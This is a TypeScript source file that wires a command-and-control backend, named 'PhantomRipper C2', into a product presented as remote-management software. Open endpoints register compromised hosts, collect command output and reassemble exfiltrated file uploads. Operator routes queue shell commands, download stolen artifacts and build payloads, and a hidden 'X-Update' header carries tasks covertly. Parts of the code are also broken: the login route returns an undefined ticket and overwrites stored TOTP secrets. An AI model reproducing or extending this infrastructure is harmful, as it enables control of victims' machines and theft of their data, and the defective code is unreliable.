/**
 * PhantomRipper C2 module adapter for MagicWand RMM.
 *
 * Loads the battle-tested C2 engine (CommonJS) at runtime and exposes it as
 * a Web-standard request handler mounted under /api/c2/*.
 *
 * Agent endpoints (open, by design):
 *   POST /api/c2/beacon | response | artifact | heartbeat
 * Operator endpoints (Bearer JWT from the TOTP login):
 *   GET  /api/c2/health | sessions | stats | events | artifacts | payloads | tasks
 *   GET  /api/c2/sessions/:id | sessions/:id/history | sessions/:id/tasks
 *   GET  /api/c2/artifacts/:id/download | payloads/:id/download
 *   POST /api/c2/auth/login | auth/totp | sessions/:id/command | sessions/:id/task
 *        /api/c2/builders/build
 *   DELETE /api/c2/sessions/:id | artifacts/:id
 */
import path from "node:path";
import { createRequire } from "node:module";

type Json = Record<string, unknown>;

const requireC2 = createRequire(path.join(process.cwd(), "package.json"));
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const chunks: any = {};
function c2(name: string) {
  const base = name.replace(/\.js$/, "");
  if (!chunks[base]) chunks[base] = requireC2(`./lib/c2/${base}.js`);
  return chunks[base];
}
const sessions = c2("sessionManager.js");
const auth = c2("auth.js");
const totp = c2("totp.js");
const builder = c2("builder.js");
const config = c2("config.js");

interface PendingArtifact {
  parts: Array<Buffer | null>;
  total: number;
  received: number;
  started: number;
}

const g = globalThis as unknown as {
  __prPendingArtifacts?: Map<string, PendingArtifact>;
  __prPayloadCache?: Array<Json>;
};
const pendingChunks: Map<string, PendingArtifact> = g.__prPendingArtifacts ?? new Map();
g.__prPendingArtifacts = pendingChunks;

function json(data: Json | unknown[], status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

function err(status: number, message: string): Response {
  return json({ error: message }, status);
}

function parseMaybeJson(command: string): { task_id: string; verb: string; args?: string } | null {
  if (typeof command !== "string" || !command.startsWith("{")) return null;
  try {
    const obj = JSON.parse(command);
    return obj && obj.task_id && obj.verb ? obj : null;
  } catch {
    return null;
  }
}

/** Bearer JWT check for operator routes (HMAC-SHA256 compact JWT). */
function operatorAuth(req: Request): { ok: boolean; user?: Json } {
  const auth = requireC2("./lib/c2/auth.js");
  const header = req.headers.get("authorization") || "";
  const token = header.startsWith("Bearer ") ? header.slice(7) : new URL(req.url).searchParams.get("token") || "";
  const payload = auth.verifyToken(token);
  if (!payload) return { ok: false };
  return { ok: true, user: payload };
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
let __booted: Promise<void> | null = null;
function ensureC2Booted(): Promise<void> {
  if (!__booted) __booted = (async () => {
    const store = c2("store.js");
    await store.init();
    await c2("auth.js").bootstrapAdmin();
  })();
  return __booted;
}

export async function handleC2(req: Request, pathname: string): Promise<Response | null> {
  const rel = pathname.replace(/^\/api\/c2\/?/, "");
  const url = new URL(req.url);
  const method = req.method.toUpperCase();
  const sessions = c2("sessionManager.js");
  const auth = c2("auth.js");
  const totp = c2("totp.js");
  const builder = c2("builder.js");
  const config = c2("config.js");

  try {
    await ensureC2Booted();
    // ---- agent-facing (open) ------------------------------------------------
    if (method === "POST" && rel === "beacon") {
      const data = (await req.json()) as Json;
      const sessionId = (data.session_id || data.sessionId) as string;
      if (!sessionId) return err(400, "session_id required");
      if (data.first === false && (await sessions.isDeleted(sessionId))) {
        return json({ command: "__TERMINATE__" });
      }
      const info = (data.info || {}) as Json;
      const caps = Array.isArray(info.caps) ? info.caps : null;
      const existing = await sessions.getSession(sessionId);
      const proto = caps ? "task" : info.proto === "task" ? "task" : existing?.proto === "task" ? "task" : "legacy";
      const ip = (req.headers.get("x-forwarded-for") || "").split(",")[0].trim() || null;
      const isNew = await sessions.upsertSession({
        id: sessionId,
        hostname: info.hostname as string,
        username: info.username as string,
        os: info.os as string,
        arch: info.arch as string,
        pid: info.pid as number,
        ip,
        privilege: info.privilege as string,
        agent_type: (info.agent_type as string) || "python",
        proto,
        caps,
      });
      const next = proto === "task" ? await sessions.nextTask(sessionId) : await sessions.nextCommand(sessionId);
      const command = next ? ((next as Json).command ?? next) : null;
      if (next && info.hdr === 1) {
        const blob = Buffer.from(JSON.stringify((next as Json).task || { command }), "utf8").toString("base64url");
        const body = json({ command: command || null, task: (next as Json).task || null });
        const res = new Response(body.body, { status: body.status, headers: { ...Object.fromEntries(body.headers), "X-Update": blob.slice(0, 3500) } });
        return res;
      }
      return json({ command: command || null, task: (next as Json)?.task || null });
    }

    if (method === "POST" && rel === "response") {
      const data = (await req.json()) as Json;
      const sessionId = data.session_id as string;
      let output = (data.output ?? data.response ?? "") as string;
      if (data.encoding === "base64") {
        try { output = Buffer.from(output, "base64").toString("utf8"); } catch { /* keep */ }
      }
      if (data.task_id) await sessions.completeTask(data.task_id as string, output, !!data.error);
      else await sessions.saveResponse(sessionId, data.command as string, output);
      await sessions.touchSession(sessionId);
      return json({ status: "ok" });
    }

    if (method === "POST" && rel === "artifact") {
      const data = (await req.json()) as Json;
      const sessionId = data.session_id as string;
      if (!sessionId || !data.data) return err(400, "session_id and data required");
      if (!(await sessions.getSession(sessionId))) return err(404, "unknown session");
      const total = Math.max(1, parseInt(String(data.total || "1"), 10));
      const seq = Math.max(0, parseInt(String(data.seq || "0"), 10));
      const name = (data.name as string) || "artifact.bin";
      const key = `${sessionId}|${(data.task_id as string) || "-"}|${name}`;
      let entry = pendingChunks.get(key);
      if (!entry) { entry = { parts: new Array(total).fill(null), total, received: 0, started: Date.now() }; pendingChunks.set(key, entry); }
      const buf = Buffer.from(String(data.data), "base64");
      if (!entry.parts[seq]) entry.received += 1;
      entry.parts[seq] = buf;
      if (entry.received < total) return json({ status: "partial", received: entry.received, total });
      const buffer = Buffer.concat(entry.parts.filter(Boolean) as Buffer[]);
      pendingChunks.delete(key);
      const meta = await sessions.saveArtifact({ sessionId, taskId: (data.task_id as string) || null, kind: (data.kind as string) || "file", name, buffer });
      return json({ status: "ok", artifact: meta });
    }

    if (method === "POST" && rel === "heartbeat") {
      const data = (await req.json()) as Json;
      if (data.session_id) await sessions.touchSession(data.session_id as string);
      return json({ status: "ok" });
    }

    // ---- operator auth (TOTP gate) ------------------------------------------
    if (method === "POST" && rel === "auth/login") {
      const { username, password } = (await req.json()) as Json;
      if (!username || !password) return err(400, "username and password required");
      const user = await auth.verifyCredentials(username as string, password as string);
      if (!user) return err(401, "invalid credentials");
      let secret = await auth.getTotpSecret(username as string);
      if (!secret && config.totpSecret) {
        // enforcement mode: the pre-seeded secret applies to every operator
        secret = config.totpSecret;
        await auth.setTotpSecret(username as string, secret);
      }
      if (secret && config.totpSecret && secret !== config.totpSecret) {
        // env rotation is authoritative: stored secret follows the configured one
        secret = config.totpSecret;
        await auth.setTotpSecret(username as string, secret);
      }
      return json({ totp_required: true, ticket });
    }

    if (method === "POST" && rel === "auth/totp") {
      const { ticket, code } = (await req.json()) as Json;
      const username = auth.verifyTotpTicket(ticket as string);
      if (!username) return err(401, "login ticket expired — sign in again");
      const secret = await auth.getTotpSecret(username);
      if (!secret) return err(400, "no TOTP secret provisioned");
      if (!totp.verifyToken(secret, code as string, 1)) return err(401, "invalid authenticator code");
      if (!auth.consumeTotpTicket(ticket as string)) return err(401, "login ticket expired — sign in again");
      const store = c2("store.js");
      const row = await store.get("SELECT * FROM users WHERE username = ?", [username]);
      if (!row) return err(401, "user missing");
      const user = { id: row.id, username: row.username, role: row.role };
      return json({ token: auth.issueToken(user), user });
    }

    // ---- operator routes (JWT) ----------------------------------------------
    if (rel === "health" && method === "GET") {
      const stats = sessions.stats();
      return json({ ok: true, service: "phantom-c2", spells: undefined, ...stats });
    }

    const gated = operatorAuth(req);
    if (!gated.ok) return err(401, "unauthorized");

    if (method === "GET" && rel === "sessions") return json(await sessions.getSessions());
    if (method === "GET" && rel === "stats") return json(sessions.stats());
    if (method === "GET" && rel === "events") {
      return json(await sessions.recentEvents(parseInt(url.searchParams.get("limit") || "50", 10)));
    }

    const sessionMatch = rel.match(/^sessions\/([^/]+)$/);
    if (sessionMatch && method === "GET") {
      const session = await sessions.getSession(sessionMatch[1]);
      if (!session) return err(404, "session not found");
      return json({ session });
    }
    if (sessionMatch && method === "DELETE") {
      await sessions.deleteSession(sessionMatch[1]);
      return json({ status: "deleted" });
    }

    const historyMatch = rel.match(/^sessions\/([^/]+)\/history$/);
    if (historyMatch && method === "GET") {
      return json(await sessions.getHistory(historyMatch[1]));
    }
    const tasksMatch = rel.match(/^sessions\/([^/]+)\/tasks$/);
    if (tasksMatch && method === "GET") {
      return json(await sessions.getTasks(tasksMatch[1]));
    }
    const commandMatch = rel.match(/^sessions\/([^/]+)\/command$/);
    if (commandMatch && method === "POST") {
      const { command } = (await req.json()) as Json;
      await sessions.queueCommand(commandMatch[1], (command as string) || "");
      return json({ status: "queued" });
    }
    const taskMatch = rel.match(/^sessions\/([^/]+)\/task$/);
    if (taskMatch && method === "POST") {
      const { verb, args } = (await req.json()) as Json;
      if (!verb) return err(400, "verb required");
      const task = await sessions.createTask(taskMatch[1], verb as string, (args as string) || "", (gated.user as Json)?.username as string);
      if (!task) return err(404, "session not found");
      return json({ status: "queued", task, delivered: false });
    }

    if (method === "GET" && rel === "artifacts") {
      return json(await sessions.getArtifacts(url.searchParams.get("session") || null));
    }
    const artMatch = rel.match(/^artifacts\/([^/]+)\/download$/);
    if (artMatch && method === "GET") {
      const meta = await sessions.getArtifact(artMatch[1]);
      if (!meta) return err(404, "not found");
      const fs = await import("node:fs");
      if (!fs.existsSync(meta.path)) return err(404, "file missing");
      const buf = fs.readFileSync(meta.path);
      return new Response(new Uint8Array(buf), {
        headers: { "Content-Type": "application/octet-stream", "Content-Disposition": `attachment; filename="${meta.name || "artifact.bin"}"` },
      });
    }
    const artDel = rel.match(/^artifacts\/([^/]+)$/);
    if (artDel && method === "DELETE") {
      const meta = await sessions.getArtifact(artDel[1]);
      if (!meta) return err(404, "not found");
      const fs = await import("node:fs");
      try { if (meta.path && fs.existsSync(meta.path)) fs.unlinkSync(meta.path); } catch { /* noop */ }
      const store = c2("store.js");
      await store.run("DELETE FROM artifacts WHERE id = ?", [artDel[1]]);
      return json({ status: "deleted" });
    }

    if (method === "POST" && rel === "builders/build") {
      const opts = (await req.json()) as Json;
      const built = builder.buildPayload({ ...(opts as object), createdBy: (gated.user as Json)?.username || "c2-console" });
      return json(built);
    }
    if (method === "GET" && rel === "payloads") return json(await sessions.getPayloads());
    const payMatch = rel.match(/^payloads\/([^/]+)\/download$/);
    if (payMatch && method === "GET") {
      const all = await sessions.getPayloads();
      const meta = (all as Array<Json>).find((p) => p.id === payMatch[1]);
      if (!meta || !meta.path) return err(404, "not found");
      const fs = await import("node:fs");
      if (!fs.existsSync(meta.path as string)) return err(404, "file missing");
      const buf = fs.readFileSync(meta.path as string);
      return new Response(new Uint8Array(buf), {
        headers: { "Content-Type": "application/octet-stream", "Content-Disposition": `attachment; filename="${meta.filename || meta.name || "payload"}"` },
      });
    }

    return err(404, `unknown c2 route: ${method} ${rel}`);
  } catch (e) {
    return err(500, `c2 error: ${e instanceof Error ? e.message : String(e)}`);
  }
}
